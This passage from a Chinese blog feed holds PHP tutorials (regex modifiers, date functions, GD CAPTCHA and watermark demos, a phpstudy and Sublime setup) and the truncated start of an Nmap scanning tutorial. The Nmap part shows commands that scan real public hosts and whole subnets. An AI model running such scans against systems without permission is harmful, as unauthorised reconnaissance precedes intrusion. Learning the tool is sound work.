class="meta">&lt;?php</span></span><br><span class="line">$pattern = <span class="string">&#x27;/test/i&#x27;</span>;</span><br><span class="line">$str =<span class="string">&#x27;   test  TESt  Test  TeSt  &#x27;</span>;</span><br><span class="line">var_dump(preg_match_all($pattern, $str, $arr));</span><br><span class="line">var_dump($arr);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot; &lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个可以匹配到四个。此时大小写不区分。<br><code>m</code>    多行匹配，如果目标字符串中没有‘\n’字符或者模式中没有出现<code>^或$</code>，设置这个修饰符不产生任何影响。<br>使用条件：<br>1.目标字符串中必须包含“\n”；并且，在字符串中，出现了“\n”,那么就表示新的一行的开始。<br>2.正则表达式中必须要出现<code>^或$</code><br>demo示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pattern = <span class="string">&#x27;/^test/m&#x27;</span>;</span><br><span class="line">$str =<span class="string">&quot;test\ntest\ntest\ntest&quot;</span>;<span class="comment">//注意这里使用双引号</span></span><br><span class="line">var_dump(preg_match_all($pattern, $str, $arr));</span><br><span class="line">var_dump($arr);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200407153107247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br><code>s</code>此模式修正符设定后，则<code>.</code>将匹配所有的字符 ，<strong>包括换行符</strong><br><code>U</code>禁止贪婪匹配。<br>模式修正符也可搭配使用。</p><h3 id="与正则表达式配合的函数"><a href="#与正则表达式配合的函数" class="headerlink" title="与正则表达式配合的函数"></a>与正则表达式配合的函数</h3><ul><li><code>preg_match()</code>执行一个正则表达式匹配，匹配0次或1次就停止。<br>参数说明：<br>  第一个参数：正则表达式。<br>  第二个参数：目标字符串。<br>  第三个参数：放一个变量，执行完成之后，里面会有匹配到的部分以及等等一些数据。<br>  第四个参数：可以传PREG_OFFSET_CAPTURE进入（那么第三个参数那个变量里面就会有匹配到的部分的偏移值）默认传的是0<br>  第五个参数：可以传一个值，来表示从目标字符串的哪个位置开始搜索（单位是字节）。<br>  一个demo示例<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pattern = <span class="string">&#x27;/t(.*?)st/&#x27;</span>;</span><br><span class="line">$str = <span class="string">&#x27;adsashtest  tshahgcst   test   tschcbcgst   &#x27;</span>;</span><br><span class="line">var_dump(preg_match($pattern, $str,$arr));</span><br><span class="line">var_dump($arr);</span><br><span class="line"><span class="keyword">if</span>(preg_match($pattern, $str,$arr,PREG_OFFSET_CAPTURE))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;找到了！&lt;br /&gt;&quot;</span>;</span><br><span class="line">var_dump($arr);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;没找到！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>运行结果<br><img src="https://img-blog.csdnimg.cn/20200408090008697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></li><li><code>preg_match_all()</code><br>参数说明：<br>第四个参数：（可选）</li></ul><blockquote><p>PREG_PATTERN_ORDER<br>PREG_SET_ORDER<br>PREG_OFFSET_CAPTURE</p></blockquote><p>偏移值的设定。</p><ul><li><code>preg_replace()</code><br>执行一个正则表达式的搜索和替换。<br>参数说明：<br>第一个参数：正则表达式<br>第二个参数：要替换成的字符串<br>第三个参数：目标字符串<br>第四个参数（可选）：默认是-1，就是替换所有符合特征的部分。<br>第五个参数（可选）：可以放一个变量。<br>preg_replace传数组<br>第一个参数和第二个参数传数组，一一对应的去替换<h1 id="日期与时间"><a href="#日期与时间" class="headerlink" title="日期与时间"></a>日期与时间</h1>一、设置时区：一般设置上海的时区。<br>二、获取当前Unix时间戳<br>关于Unix时间戳：从格林威治时间1970年1月1日00时00分00秒开始到当前的秒数。用函数<code>time()</code>。<br>三、获取指定时间的Unix时间戳<br>函数<code>mktime()</code>参数顺序（时，分，秒，月，日，年）<br>四、从Unix时间戳取得时间日期信息<br>函数：<code>date()</code>格式化一个本地时间。<br>参数，把format字符放在参数里面。<br>五、获取Unix时间戳和微妙数<br>函数<code>microtime()</code> <h2 id="demo示例"><a href="#demo示例" class="headerlink" title="demo示例"></a>demo示例</h2>上海时间：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">date_default_timezone_set(<span class="string">&#x27;Asia/Shanghai&#x27;</span>);<span class="comment">//设置时区</span></span><br><span class="line">var_dump(time());<span class="comment">//获取当前Unix时间戳</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> mktime(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">2020</span>);<span class="comment">//自定义时间与日期</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> date(<span class="string">&#x27;Y-m-d G:i:s&#x27;</span>);<span class="comment">//格式化当前时间与日期。</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> microtime();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>运行结果：<br><img src="https://img-blog.csdnimg.cn/20200410181412710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><h1 id="图像处理"><a href="#图像处理" class="headerlink" title="图像处理"></a>图像处理</h1><h2 id="创建一个简单图像"><a href="#创建一个简单图像" class="headerlink" title="创建一个简单图像"></a>创建一个简单图像</h2>创建图像</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$img=imagecreatetruecolor(<span class="number">200</span>, <span class="number">200</span>);<span class="comment">//新建一个长和高都为200像素的真彩色图像</span></span><br></pre></td></tr></table></figure><p>分配颜色</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$color1=imagecolorallocate($img, <span class="number">46</span>, <span class="number">219</span>, <span class="number">50</span>);<span class="comment">//分配颜色</span></span><br></pre></td></tr></table></figure><p>填充颜色</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">imagefill($img, <span class="number">0</span>, <span class="number">0</span>, $color1);<span class="comment">//填充颜色 </span></span><br></pre></td></tr></table></figure><p>保存图像</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">imagejpeg($img);<span class="comment">//保存图像 </span></span><br></pre></td></tr></table></figure><p>销毁图像</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">imagedestroy($img); <span class="comment">//销毁图像</span></span><br></pre></td></tr></table></figure><p>想要在浏览器中显示，还要再加上一个header头，用来向浏览器解释这是个图片</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header(<span class="string">&#x27;Content-type:image/jpeg&#x27;</span>);<span class="comment">//向浏览器说明这是个图片</span></span><br></pre></td></tr></table></figure><p>这样就能在浏览器中看到效果图了<br><img src="https://img-blog.csdnimg.cn/20200410213126844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h2 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h2><p><code>imagesetpixel()</code>画一个单一像素<br><code>imageline()</code>画一条线段<br><code>imagerectangle()</code>画一个矩形<br><code>imagestring()</code>水平的画一行字符串<br><code>imagettftext()</code>用TrueType字体向图像写入文本<br><code>imagettfbbox()</code>计算TrueType字体所占区域<br><code>imagecopy()</code>拷贝图像的一部分<br><code>imagecopymerge()</code>拷贝并合并图像的一部分<br><code>imagecopyresampled()</code>重采样拷贝部分图像并调整大小<br>自制验证码demo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:image/jpeg&#x27;</span>);</span><br><span class="line">$width=<span class="number">120</span>;</span><br><span class="line">$height=<span class="number">40</span>;</span><br><span class="line">$string=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$element=<span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>);</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt;<span class="number">5</span> ; $i++) &#123; </span><br><span class="line">$string.=$element[rand(<span class="number">0</span>,count($element)<span class="number">-1</span>)];</span><br><span class="line">&#125;</span><br><span class="line">$img=imagecreatetruecolor($width, $height);</span><br><span class="line">$color_bg=imagecolorallocate($img, rand(<span class="number">200</span>,<span class="number">255</span>), rand(<span class="number">200</span>,<span class="number">255</span>), rand(<span class="number">200</span>,<span class="number">255</span>));</span><br><span class="line">$color_border=imagecolorallocate($img, rand(<span class="number">200</span>,<span class="number">255</span>), rand(<span class="number">200</span>,<span class="number">255</span>), rand(<span class="number">200</span>,<span class="number">255</span>));</span><br><span class="line">$color_string=imagecolorallocate($img, rand(<span class="number">10</span>,<span class="number">100</span>), rand(<span class="number">10</span>,<span class="number">100</span>), rand(<span class="number">10</span>,<span class="number">100</span>));</span><br><span class="line">imagefill($img, <span class="number">0</span>, <span class="number">0</span>, $color_bg);</span><br><span class="line">imagerectangle($img, <span class="number">0</span>, <span class="number">0</span>, $width<span class="number">-1</span>, $height<span class="number">-1</span>, $color_border);</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt;<span class="number">100</span> ; $i++) &#123; </span><br><span class="line">imagesetpixel($img, rand(<span class="number">0</span>,$width<span class="number">-1</span>), rand(<span class="number">0</span>,$height<span class="number">-1</span>), imagecolorallocate($img, rand(<span class="number">10</span>,<span class="number">100</span>), rand(<span class="number">10</span>,<span class="number">100</span>), rand(<span class="number">10</span>,<span class="number">100</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt;<span class="number">3</span> ; $i++) &#123; </span><br><span class="line">imageline($img, rand(<span class="number">0</span>,$width/<span class="number">2</span>), rand(<span class="number">0</span>,$height), rand($width/<span class="number">2</span>,$width), rand(<span class="number">0</span>,$height), imagecolorallocate($img, rand(<span class="number">10</span>,<span class="number">100</span>), rand(<span class="number">10</span>,<span class="number">100</span>), rand(<span class="number">10</span>,<span class="number">100</span>)));</span><br><span class="line">&#125;</span><br><span class="line">imagettftext($img, <span class="number">25</span>, rand(<span class="number">-5</span>,<span class="number">5</span>), rand(<span class="number">5</span>,<span class="number">15</span>), rand(<span class="number">30</span>,<span class="number">35</span>), $color_string, <span class="string">&#x27;font/HARLOWSI.TTF&#x27;</span>, $string);</span><br><span class="line">imagejpeg($img);</span><br><span class="line">imagedestroy($img);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码粗略解释<br>1.用数组来实现验证码文本内容，然后随机函数，拼接字母，组成一段验证码。<br>2.提前定义一个空的<code>$string</code>，不然会报错。<br>3.颜色采用RGB模式，个别函数用时查手册。<br>运行结果：<br><img src="https://img-blog.csdnimg.cn/2020041100130423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h2 id="水印"><a href="#水印" class="headerlink" title="水印"></a>水印</h2><p>打开服务器或网络文件中已经存在的GIF、JPEG、PNG、WBMP格式图像。<br><code>imagecreatefromjpeg()</code><br><code>imagecreatefrompng()</code><br><code>imagecreatefromgif()</code><br><code>imagecreatefromwbmp()</code><br>创建或打开失败的时候就会返回空字符串，并且输出一条错误信息。<br><code>imagesx()</code>输出图片宽度<br><code>imagesy()</code>输出图片高度<br><code>getimagesize()</code>输出图像大小</p><h3 id="文字水印"><a href="#文字水印" class="headerlink" title="文字水印"></a>文字水印</h3><p>示例demo：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:image/jpeg&#x27;</span>);</span><br><span class="line">$img=imagecreatefromjpeg(<span class="string">&#x27;images/2.jpg&#x27;</span>);</span><br><span class="line">$color=imagecolorallocate($img, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">$width=imagesx($img);</span><br><span class="line">$height=imagesy($img);</span><br><span class="line">$position=imagettfbbox(<span class="number">20</span>, <span class="number">0</span>, <span class="string">&#x27;font/HARLOWSI.TTF&#x27;</span>, <span class="string">&#x27;Augendtern&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$stringwidth=$position[<span class="number">2</span>]-$position[<span class="number">0</span>];</span><br><span class="line">imagettftext($img, <span class="number">20</span>, <span class="number">0</span>, $width<span class="number">-1</span>-$stringwidth<span class="number">-10</span>, $height<span class="number">-1</span><span class="number">-10</span>, $color, <span class="string">&#x27;font/HARLOWSI.TTF&#x27;</span>, <span class="string">&#x27;Augenstern&#x27;</span>);</span><br><span class="line">imagejpeg($img);</span><br><span class="line">imagedestroy($img);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>效果如下：<br><img src="https://img-blog.csdnimg.cn/20200411201709695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>水印大小、位置均可调，还可以设定它占图片宽和高的比例。</p><h3 id="图片水印"><a href="#图片水印" class="headerlink" title="图片水印"></a>图片水印</h3><p>找好当水印的图片，与要加水印的图片放在同一路径下。<br><img src="https://img-blog.csdnimg.cn/20200411203450601.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>demo示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:image/jpeg&#x27;</span>);</span><br><span class="line">$img=imagecreatefromjpeg(<span class="string">&#x27;images/2.jpg&#x27;</span>);</span><br><span class="line">$watermark=imagecreatefromgif(<span class="string">&#x27;images/2.gif&#x27;</span>);</span><br><span class="line">$color=imagecolorallocate($img, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">$width=imagesx($img);</span><br><span class="line">$height=imagesy($img);</span><br><span class="line">$watermarkwidth=imagesx($watermark);</span><br><span class="line">$watermarkheight=imagesy($watermark);</span><br><span class="line">$position=imagettfbbox(<span class="number">20</span>, <span class="number">0</span>, <span class="string">&#x27;font/HARLOWSI.TTF&#x27;</span>, <span class="string">&#x27;Augendtern&#x27;</span>);</span><br><span class="line">$stringwidth=$position[<span class="number">2</span>]-$position[<span class="number">0</span>];</span><br><span class="line">imagettftext($img, <span class="number">20</span>, <span class="number">0</span>, $width<span class="number">-1</span>-$stringwidth<span class="number">-10</span>, $height<span class="number">-1</span><span class="number">-10</span>, $color, <span class="string">&#x27;font/HARLOWSI.TTF&#x27;</span>, <span class="string">&#x27;Augenstern&#x27;</span>);</span><br><span class="line">imagecopy($img, $watermark, <span class="number">400</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">0</span>, $watermarkwidth, $watermarkheight);</span><br><span class="line">imagejpeg($img);</span><br><span class="line">imagedestroy($img);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果有文字水印还有图片水印<br><img src="https://img-blog.csdnimg.cn/20200411204901809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>效果不怎么样，将就着还能看。<br>部分参数说明：<br><code>imagecopy()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">imagecopy(dst_im, src_im, dst_x, dst_y, src_x, src_y, src_w, src_h)</span><br></pre></td></tr></table></figure><p>第一个参数是加水印的图片（方便区分，我叫它原图），<br>第二个参数是水印图片，<br>第三个参数是水印要加在原图的什么位置。左上角还是右上角来着我容易记混，干脆就不记了，直接看效果来判断向什么方向移动。<br>第四个参数和第五个参数是从水印图片什么位置开始拷贝。同样不记得位置，（办法总比困难多，我相信都会有自己的解决办法的。😁😁😁）<br>第六个参数和第七个参数是截取水印的宽度和高度。</p><p>这次学习就到这里。 坚持下去，加油。奥利给！🤣</p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpstudy+Sublime Test3创建PHP编译环境</title>
      <link href="/2020/08/23/phpstudy+Sublime%20Text%203%E5%88%9B%E5%BB%BAPHP%E7%BC%96%E8%AF%91%E7%8E%AF%E5%A2%83/"/>
      <url>/2020/08/23/phpstudy+Sublime%20Text%203%E5%88%9B%E5%BB%BAPHP%E7%BC%96%E8%AF%91%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<p>前言：学习PHP，一个好的编译软件是必不可少的（看着舒服）。刚好有Sublime（很强大的一个文本编译器谁用谁爽），就用它来编。</p><h1 id="phpstudy设置"><a href="#phpstudy设置" class="headerlink" title="phpstudy设置"></a>phpstudy设置</h1><p>打开phpstudy，设置php的版本，我这里修改的是<code>php-5.4.45-nts+Apache</code><img src="https://img-blog.csdnimg.cn/20200327001135501.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后记住你选的这个版本。在phpstudy的文件目录下找到它。<br><img src="https://img-blog.csdnimg.cn/20200327001912415.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>找到后，打开它，复制它的路径<br><img src="https://img-blog.csdnimg.cn/20200327002011525.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>添加环境变量<br><img src="https://img-blog.csdnimg.cn/20200327002141365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后添加粘贴复制的路径，就添加成功了，<br><img src="https://img-blog.csdnimg.cn/20200327002306628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后确定=&gt;确定=&gt;确定<br>打开cmd，输入<code>php -v</code>，出现下图的信息就是成功了。<br><img src="https://img-blog.csdnimg.cn/2020032700244348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h1 id="Sublime"><a href="#Sublime" class="headerlink" title="Sublime"></a>Sublime</h1><p>进入Sublime，点击tools=&gt;Build System=&gt;New Build System<br><img src="https://img-blog.csdnimg.cn/20200327002706490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后出现这个<br><img src="https://img-blog.csdnimg.cn/20200327002839145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>把原来的代码全删了，复制下面的内容，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123; </span><br><span class="line">    <span class="string">&quot;cmd&quot;</span>: [<span class="string">&quot;php&quot;</span>, <span class="string">&quot;$file&quot;</span>],</span><br><span class="line">    <span class="string">&quot;file_regex&quot;</span>: <span class="string">&quot;php$&quot;</span>, </span><br><span class="line">    <span class="string">&quot;selector&quot;</span>: <span class="string">&quot;source.php&quot;</span> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200327003104822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后Ctrl+Shift+S另存为<code>Roaming\Sublime Text 3\Packages\User</code><br><img src="https://img-blog.csdnimg.cn/20200327003320179.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后保存就完成了<br>可以创建一个php项目试试效果。<br><img src="https://img-blog.csdnimg.cn/2020032700351160.png" alt="Augenstern" loading="lazy"><br>这个是可以选择的，然后选择PHP就可以直接写代码<br><img src="https://img-blog.csdnimg.cn/20200327003735261.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这是个错误案例，像我一样的新手可能会犯这样的错误。<br>原因很简单就是没有保存，将文件保存后就可以运行了。<br>在看一个正确的<br><img src="https://img-blog.csdnimg.cn/2020032700444019.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h1 id="小疑问（已解决）"><a href="#小疑问（已解决）" class="headerlink" title="小疑问（已解决）"></a>小疑问（已解决）</h1><p>我原本有个疑问就是PHP要编译的话需要Apache+php运行环境+mysql那我把phpstudy关了，是不是就不能编译了？？？？？然后我就去试了一下，发现这些不影响。还可以编译运行。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 工具人 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nmap学习</title>
      <link href="/2020/08/23/Nmap%E5%AD%A6%E4%B9%A0/"/>
      <url>/2020/08/23/Nmap%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>Nmap是个强大的扫描工具</p><p>1、用主机名和IP地址扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用主机名和IP地址进行扫描大概是最为常见的一种扫描方式，示例：nmap www.baidu.com</span><br></pre></td></tr></table></figure><p>这样可以得到被扫描目标的端口、服务和Mac信息</p><p><img src="https://img-blog.csdnimg.cn/20200524153620648.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_RGV2b3Vy,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><p>2、列出详细信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用-v参数来让nmap返回更详细的信息</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200524153923633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_RGV2b3Vy,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><p>3、扫描多个目标</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果你已经知道了多个目标的IP或者主机名，你可以直接在命令后面添加多个需要扫描的目标。示例：nmap 61.135.169.121 103.95.221.36</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200524160039135.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_RGV2b3Vy,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果你并不知道，只是需要扫描整个子网的网段或者是某个IP范围内的目标，可以使用通配符*来扫描。示例：nmap 192.168.0.*这样nmap就会自动扫描从192.168.0.0到192.168.0.255的所有目标，然后给出信息。</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200524160211463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_RGV2b3Vy,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 